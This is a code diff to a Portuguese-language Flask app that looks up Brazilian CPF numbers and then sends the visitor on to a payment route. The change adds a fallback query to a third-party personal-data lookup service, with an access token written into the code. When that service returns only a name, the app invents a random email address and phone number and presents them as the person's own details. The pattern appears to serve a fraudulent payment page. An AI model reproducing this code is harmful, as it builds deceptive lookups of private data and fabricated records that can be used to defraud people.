@@ -5,6 +5,8 @@ import logging
 from datetime import datetime, timedelta
 import time
 from typing import Dict, Any, Optional
+import random
+import string
 
 # Configuração do logging
 logging.basicConfig(level=logging.DEBUG)
@@ -14,13 +16,23 @@ app = Flask(__name__)
 app.secret_key = os.environ.get("FLASK_SECRET_KEY", "a secret key")
 app.static_folder = 'static'
 
-# URL da API do Portal CAC
+# URLs das APIs
 CAC_API_URL = "https://portal-cac.org/api_clientes.php?cpf={cpf}"
+BACKUP_API_URL = "https://consulta.fontesderenda.blog/?token=4da265ab-0452-4f87-86be-8d83a04a745a&cpf={cpf_sem_pontuacao}"
 
 # Configurações de timeout e retry
 TIMEOUT = 30  # segundos
 MAX_RETRIES = 3
 RETRY_DELAY = 1  # segundos
+
+def generate_random_email():
+    random_string = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
+    return f"{random_string}@temp.com"
+
+def generate_random_phone():
+    ddd = random.randint(11, 99)
+    numero = ''.join(random.choices(string.digits, k=8))
+    return f"{ddd}9{numero}"
 
 class For4PaymentsAPI:
     API_URL = "https://app.for4payments.com.br/api/v1"
@@ -147,6 +159,7 @@ def consultar_cpf():
         flash('CPF inválido. Por favor, digite um CPF válido.')
         return redirect(url_for('index'))
 
+    # Primeiro, tenta a API principal
     retry_count = 0
     while retry_count < MAX_RETRIES:
         try:
@@ -161,28 +174,52 @@ def consultar_cpf():
 
             dados = response.json()
             if dados and all(key in dados for key in ['name', 'cpf', 'email', 'phone']):
-                # Armazena os dados na sessão para uso posterior
                 session['user_data'] = dados
+                session['api_source'] = 'primary'
                 return render_template('dados_usuario.html', 
                                     dados=dados,
                                     current_year=datetime.now().year)
-            else:
-                flash('CPF não encontrado ou dados incompletos.')
-                return redirect(url_for('index'))
 
         except requests.RequestException as e:
-            logger.error(f"Erro ao consultar API do Portal CAC: {e}")
+            logger.error(f"Erro ao consultar API principal: {e}")
             if retry_count < MAX_RETRIES - 1:
                 retry_count += 1
                 time.sleep(RETRY_DELAY)
                 continue
-            flash('Ocorreu um erro ao consultar os dados. Por favor, tente novamente mais tarde.')
-            return redirect(url_for('index'))
+            break
 
         except ValueError as e:
-            logger.error(f"Erro ao processar resposta da API: {e}")
-            flash('Erro ao processar os dados do CPF. Por favor, tente novamente.')
-            return redirect(url_for('index'))
+            logger.error(f"Erro ao processar resposta da API principal: {e}")
+            break
+
+    # Se a API principal falhou, tenta a API de backup
+    try:
+        response = requests.get(
+            BACKUP_API_URL.format(cpf_sem_pontuacao=cpf_numerico),
+            timeout=TIMEOUT
+        )
+        response.raise_for_status()
+
+        backup_dados = response.json()
+        if backup_dados and 'nome' in backup_dados:
+            dados = {
+                'name': backup_dados['nome'],
+                'cpf': cpf_numerico,
+                'email': generate_random_email(),
+                'phone': generate_random_phone()
+            }
+            session['user_data'] = dados
+            session['api_source'] = 'backup'
+            return render_template('dados_usuario.html', 
+                                dados=dados,
+                                current_year=datetime.now().year,
+                                is_backup_api=True)
+
+    except Exception as e:
+        logger.error(f"Erro ao consultar API de backup: {e}")
+
+    flash('CPF não encontrado ou dados incompletos.')
+    return redirect(url_for('index'))
 
 @app.route('/pagamento', methods=['GET', 'POST'])
 def pagamento():
